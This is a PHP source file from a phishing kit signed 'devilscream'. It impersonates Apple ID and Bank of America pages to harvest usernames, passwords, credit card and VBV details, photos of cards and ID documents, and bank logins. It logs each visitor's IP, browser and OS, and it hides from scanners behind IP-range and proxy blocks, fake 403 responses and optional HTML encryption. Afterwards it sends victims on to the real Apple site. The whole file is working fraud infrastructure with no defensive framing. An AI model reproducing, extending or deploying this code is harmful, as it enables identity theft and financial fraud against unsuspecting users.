<?php
// scampage by devilscream
session_start();
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
$random_id = sha1(rand(0,1000000));
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);

if($_SESSION['udah'] == "y") {
    header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
    exit();
}
$setting = parse_ini_file('../.config');

if($setting['site_password'] == 1) {
    if($_SESSION['site_password'] == "") {
        //header("location: $link");exit();
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}
if($setting['site_parameter'] == 1) {
    if($_SESSION['site_parameter'] == "") {
        //header("location: $link");exit();
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
}

//include '../block2.php';
//include '../block1.php';
if($setting['block_iprange'] == "1") {
    include '../block4.php';
}
include '../main.php';
if($setting['proxy_block'] == 1) {
    include '../proxyblock.php';
}
if(!function_exists("validate")){
    die("Please dont recode! //devilscream");
}
function getOSsss() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/cros/i'            =>  'Chrome OS',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

$os        =   getOSsss();

function getBrowsersss() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

$br        =   getBrowsersss();

include '../lang.php';
include 'header.php';
if($_SESSION['status'] == "") {
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}
echo "<!--$random_id-->";
if($setting['encrypt_html'] == "1"){
include 'enkr1p.php';
}
$random_number_id = sha1(rand(0,1000000));
$random_number_id2 = md5(rand(100,900000));
?>
<!DOCTYPE html>
<html>
  <head>
    <!--<?php echo $random_number_id;?>-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="../assets/css/modal.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="../assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="../assets/img/favicon.ico">
    <?php
    if($_GET['view'] == "boalogin" or $_GET['view'] == "boaverif") {
        echo '<link rel="shortcut icon" href="../assets/img/boa.ico">
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/img/boa.ico">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/img/boa.ico">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/img/boa.ico">
        <link rel="apple-touch-icon-precomposed" href="../assets/img/boa.ico">
        <link rel="shortcut icon" sizes="196x196" href="../assets/img/boa.ico">
        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/boa.ico">';
    }else{
        echo '<link rel="shortcut icon" href="../assets/img/favicon.ico">
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/img/favicon.ico">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/img/favicon.ico">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/img/favicon.ico">
        <link rel="apple-touch-icon-precomposed" href="../assets/img/favicon.ico">
        <link rel="shortcut icon" sizes="196x196" href="../assets/img/favicon.ico">
        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">';
    }
    ?>
     <script type="text/javascript" src="../assets/js/jquery.js"></script>
     <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>
    <!--<?php echo $random_number_id2;?>-->
<?php
if ($_GET['view'] == "login") {
$ID = $_POST["xuser"];
$PW = $_POST["xpass"];
$_SESSION['xusername'] = $ID;
$_SESSION['xpassword'] = $PW;

if (isset($ID) && isset($PW)) {
        include 'truelogin.php';
          }else{
            $click = fopen("../result/total_click.txt","a");
            fwrite($click,"$ip2"."\n");
            fclose($click);
        ?>
            <div class="container-fluid">
                <div class="row clearfix">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/login-mobile.php';
                }
                ?>
               
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/login-desktop.php';
                }
                ?>
                </div>
            </div>
        <?php
      } 

}elseif ($_GET['view'] == "update") {
    session_start();
    if($_SESSION['email'] == "") {
        echo "<script type='text/javascript'>window.top.location='?view=login&appIdKey=".$_SESSION['key']."&country=".$cid."&error=1';</script>";
    }
    
    if (isset($_POST["vbv"]) or isset($_POST["cardid"])) {
        include 'vbv.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Credit Card"."\n");
    fclose($click);
        ?>
            <div class="container-fluid">
                <div class="row clearfix">
                <script src="../assets/js/jquery.payment.js"></script>
                <script src="../assets/js/payment.js"></script>
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                    if($setting['get_vbv'] == "1") {
                        include_once 'files/mobile-billing.php';
                    }else{
                        include_once 'files/mobile-billing-novbv.php';
                    }
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                    if($setting['get_vbv'] == "1") {
                        include_once 'files/desktop-billing.php';
                    }else{
                        include_once 'files/desktop-billing-novbv.php';
                    }
                }
                ?>
                </div>
            </div>

        <?php
    }
}
elseif ($_GET['view'] == "vbv") {
    $countryna = $_GET['country'];
    if (isset($_POST["vbv"]) or isset($_POST["cardid"])) {
            include 'vbv.php';
    }
    ?>
                <br>
                <script>
    Array.prototype.forEach.call(document.querySelectorAll('link[rel=stylesheet]'), function(element){
      try{
        element.parentNode.removeChild(element);
      }catch(err){}
    });

//or this is similar
var elements = document.querySelectorAll('link[rel=stylesheet]');
for(var i=0;i<elements.length;i++){
    elements[i].parentNode.removeChild(elements[i]);
}
    </script>
                <?php 
                if($os == "Android" or $os == "iPhone") {
                    if($countryna == "JP") {
                        include 'files/vbv-jp.php';
                    }else{
                        include 'files/vbv.php';
                    }
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                    if($countryna == "JP") {
                        include 'files/vbv-jp.php';
                    }else{
                        include 'files/vbv.php';
                    }
                }
                ?>
    <?php
}
elseif ($_GET['view'] == "upload") {
    if (isset($_FILES["file"])) {
        include 'upload.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Upload CC"."\n");
    fclose($click);
    ?>
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/upload-mobile.php';
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/upload.php';
                }
                ?>
                </div>
        </div>
    <?php
    }
}
elseif ($_GET['view'] == "upload_id") {
    if (isset($_FILES["file"])) {
        include 'uploadid.php';
    }else{
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Membuka Form Upload ID"."\n");
    fclose($click);
    ?>
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/uploadid-mobile.php';
                }
                ?>
                
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/uploadid.php';
                }
                ?>
                </div>
        </div>
    <?php
    }
}
elseif ($_GET['view'] == "done") {
    $click = fopen("../result/log_visitor.txt","a");
    $jam = date("h:i:sa");
    fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Selesai Mengisi Data"."\n");
    fclose($click);
    if($autoblock == "1"){
$_SESSION['udah'] = "y";
    }
    ?> 
		
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
                <?php 
                if($os == "Android" or $os == "iPhone") {
                include_once 'files/done-mobile.php';
                }
                ?>
                <?php 
                if($os == "Android" or $os == "iPhone") {
                }else{
                include_once 'files/done.php';
                }
                ?>
                
                </div>
        </div>
    <?php
}
elseif ($_GET['view'] == "success") {
    session_start();
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    echo "<script type='text/javascript'>window.top.location='https://appleid.apple.com';</script>";
    $_SESSION['firstname'] = "";
        
}
elseif ($_GET['view'] == "boalogin") {
    if (isset($_POST["onlineid"])) {
        include 'banklogin.php';
    }else{
        include_once 'bank/boa.php';
    }
}
elseif ($_GET['view'] == "boaverif") {
    if (isset($_POST["bank_email"])) {
        include 'bankverif.php';
    }else{
        include_once 'bank/boa-verif.php';
    }
}
?>
  <body>
</html>
